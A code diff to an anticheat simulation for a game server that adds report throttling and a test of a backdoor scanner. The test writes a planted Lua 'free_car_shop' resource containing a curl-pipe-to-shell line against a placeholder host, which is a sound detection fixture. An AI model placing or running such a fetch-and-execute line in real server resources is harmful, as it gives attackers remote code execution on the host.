@@ -1,4 +1,5 @@
 using System.Diagnostics;
+using JcksAnticheat.Core.Backdoor;
 using JcksAnticheat.Core.Bans;
 using JcksAnticheat.Core.Config;
 using JcksAnticheat.Core.Dashboard;
@@ -26,6 +27,7 @@ int AddPlayer(string name)
 }
 
 var banned = new HashSet<int>();
+var throttle = new JcksAnticheat.Core.Logging.ReportThrottle();
 var rows = new List<(string scenario, string player, string layer, string codes, string action)>();
 var now = DateTime.UtcNow;
 
@@ -36,12 +38,13 @@ void Handle(string scenario, int id, IEnumerable<Violation> violations, string l
     foreach (var v in list)
     {
         ledger.Record(v, now);
+        now = now.AddMilliseconds(100);
         actions.Add(v.Action.ToString().ToLowerInvariant());
-        bridge?.Enqueue("detection", new Dictionary<string, object?>
+        if (throttle.ShouldReport(v, now, out var repeats)) bridge?.Enqueue("detection", new Dictionary<string, object?>
         {
             ["player"] = v.Player, ["name"] = players[v.Player].name, ["code"] = v.Code, ["source"] = v.Source.ToString().ToLowerInvariant(),
             ["severity"] = v.Severity, ["score"] = Math.Round(v.ScoreAfter, 1), ["action"] = v.Action.ToString().ToLowerInvariant(),
-            ["evidence"] = v.Evidence, ["bypass"] = false, ["dryRun"] = false,
+            ["evidence"] = repeats > 0 ? new Dictionary<string, object?>(v.Evidence) { ["repeats"] = repeats } : v.Evidence, ["bypass"] = false, ["dryRun"] = false,
         });
         if (v.Action == EnforcementAction.Ban && banned.Add(v.Player))
         {
@@ -159,8 +162,21 @@ int missed = rows.Count(r => r.player is not ("Mara" or "Theo") && r.codes == "n
 Console.WriteLine();
 Console.WriteLine($"clean players flagged: {falsePositives}, cheaters missed: {missed}, bans: {bans.All.Count}");
 
+var fixture = Path.Combine(Path.GetTempPath(), "jac-sim-res-" + Guid.NewGuid().ToString("N"));
+Directory.CreateDirectory(Path.Combine(fixture, "server"));
+File.WriteAllText(Path.Combine(fixture, "server", "main.lua"), "local shop = {}\nRegisterNetEvent('shop:buy')\nos.execute('curl -s http://example.invalid/x | sh')\n");
+var findings = BackdoorScanner.ScanResource("free_car_shop", fixture, new ScanOptions());
+Directory.Delete(fixture, true);
+Console.WriteLine($"backdoor scan of a planted test resource: {findings.Count} finding(s): " + string.Join(", ", findings.Select(f => $"{f.Rule} {f.File}:{f.Line}")));
+
 if (bridge != null)
 {
+    bridge.Enqueue("settings", new Dictionary<string, object?> { ["config"] = cfg.ToJson(), ["schema"] = MiniJson.Parse(File.ReadAllText(Path.Combine(resource, "settings.schema.json"))) });
+    bridge.Enqueue("backdoor_scan", findings.Select(f => (object?)new Dictionary<string, object?>
+    {
+        ["id"] = f.Id, ["resource"] = f.Resource, ["file"] = f.File, ["line"] = f.Line, ["rule"] = f.Rule,
+        ["severity"] = f.Severity.ToString().ToLowerInvariant(), ["description"] = f.Description, ["snippet"] = f.Snippet,
+    }).ToList());
     bridge.Enqueue("players", players.Select(p => (object?)new Dictionary<string, object?>
     {
         ["id"] = p.Key, ["name"] = p.Value.name, ["identifiers"] = p.Value.ids, ["ping"] = 30 + p.Key * 3,
@@ -178,7 +194,7 @@ if (bridge != null)
     await bridge.FlushAsync();
     Console.WriteLine("pushed to dashboard: " + (bridge.LastError ?? "ok") + $" ({offline.Count} players kicked/banned)");
 }
-return falsePositives == 0 && missed == 0 ? 0 : 1;
+return falsePositives == 0 && missed == 0 && findings.Count > 0 ? 0 : 1;
 
 static string Trim(string s, int n) => s.Length <= n ? s : s.Substring(0, n - 1) + "…";
 
